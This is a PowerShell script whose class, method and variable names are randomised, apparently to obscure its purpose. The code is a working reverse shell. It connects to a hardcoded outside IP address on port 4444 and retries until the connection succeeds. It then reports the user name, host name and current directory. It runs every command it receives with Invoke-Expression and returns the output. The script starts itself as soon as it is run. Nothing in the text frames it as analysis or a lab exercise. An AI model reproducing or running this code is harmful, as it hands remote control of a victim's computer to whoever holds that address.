class fhDRE {
    
    [string]$BHdoeY = "93.49.240.195"
    [int]$NLjPeaVgAaVQiQWMHjOUL = 4444

    $PRaFtDnDjMUNXokyYril
    $jdqInjMwc
    $PoWZOwyOQfzw
    $jHivGALzaahKurwSD
    $WYRpQpXzngGdNmJDDaQ
    $UIhAqDVTLYzGeTGjgDip
    [int]$qifzXzFpoSHEEOheqecM = 50*1024

    aXAVjyyXLuFbUVLBKZDbO() {
        $this.jdqInjMwc = $false
        while ($true) {
            try {
                $this.jdqInjMwc = New-Object Net.Sockets.TcpClient($this.BHdoeY, $this.NLjPeaVgAaVQiQWMHjOUL)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.hxnPGRNgDKdjff()
    }

    hxnPGRNgDKdjff() {
        $this.PRaFtDnDjMUNXokyYril = $this.jdqInjMwc.GetStream()
        $this.jHivGALzaahKurwSD = New-Object Byte[] $this.qifzXzFpoSHEEOheqecM
        $this.UIhAqDVTLYzGeTGjgDip = New-Object Text.UTF8Encoding
        $this.PoWZOwyOQfzw = New-Object IO.StreamWriter($this.PRaFtDnDjMUNXokyYril, [Text.Encoding]::UTF8, $this.qifzXzFpoSHEEOheqecM)
        $this.WYRpQpXzngGdNmJDDaQ = New-Object System.IO.StreamReader($this.PRaFtDnDjMUNXokyYril)
        $this.PoWZOwyOQfzw.AutoFlush = $true
    }

    WUVIMmoRsFOPkfWEY() {
        $this.aXAVjyyXLuFbUVLBKZDbO()
        $this.BSLkdSNdNMkkL()
    }

    zLIgPzOa($AujTZWiJNTpBaUDfqt) {
        try {
            [byte[]]$VYmjpplJduohQTG = [text.Encoding]::Ascii.GetBytes($AujTZWiJNTpBaUDfqt)
            $this.PoWZOwyOQfzw.Write($VYmjpplJduohQTG, 0, $VYmjpplJduohQTG.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.WUVIMmoRsFOPkfWEY()
        }
    }

    [string] AQBacOPjeLAaHRyzuqOwjvc() {
        try {
            $lqbqmkvTgNELdSIBOtjFf = $this.PRaFtDnDjMUNXokyYril.Read($this.jHivGALzaahKurwSD, 0, $this.qifzXzFpoSHEEOheqecM)    
            $agFjIC = ($this.UIhAqDVTLYzGeTGjgDip.GetString($this.jHivGALzaahKurwSD, 0, $lqbqmkvTgNELdSIBOtjFf))
            return $agFjIC
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.WUVIMmoRsFOPkfWEY()
            return ""
        }
    }

    [string] bslhTeZVhvxvuZ($aoOvixrZGmyygMhkxrCwgou) {
        Write-Host $aoOvixrZGmyygMhkxrCwgou
        try { 
            $vhvppjpJoGwxGWDFc = Invoke-Expression $aoOvixrZGmyygMhkxrCwgou | Out-String
        }
        catch {
            $brqhuOcuYHFYznPTMrnSyGP = $_.Exception
            $gSzOGOm = $_.Message
            $vhvppjpJoGwxGWDFc = "`n$_`n"
        }
        return $vhvppjpJoGwxGWDFc
    }

    [string] NnnbjpF() {
        $FdYLuehNiPkmzK = [Environment]::UserName
        $uUtreBBNMZSEBRNEje = [System.Net.Dns]::GetHostName()
        $BpBGlwjqrBHOnv = Get-Location
        return "$FdYLuehNiPkmzK@$uUtreBBNMZSEBRNEje [$BpBGlwjqrBHOnv]~$ "
    }

    BSLkdSNdNMkkL() {
        while ($this.jdqInjMwc.Connected) {
            $this.zLIgPzOa($this.NnnbjpF())         
            $agFjIC = $this.AQBacOPjeLAaHRyzuqOwjvc()
            $vhvppjpJoGwxGWDFc = "`n"
            if ([string]::IsNullOrEmpty($agFjIC)) {
                continue
            }
            $vhvppjpJoGwxGWDFc = $this.bslhTeZVhvxvuZ($agFjIC)
            $this.zLIgPzOa($vhvppjpJoGwxGWDFc + "`n")
            $this.PRaFtDnDjMUNXokyYril.Flush()
        }
        $this.jdqInjMwc.Close()
        $this.WUVIMmoRsFOPkfWEY()
    } 
}

$ATKzTZge = [fhDRE]::new()
$ATKzTZge.WUVIMmoRsFOPkfWEY()
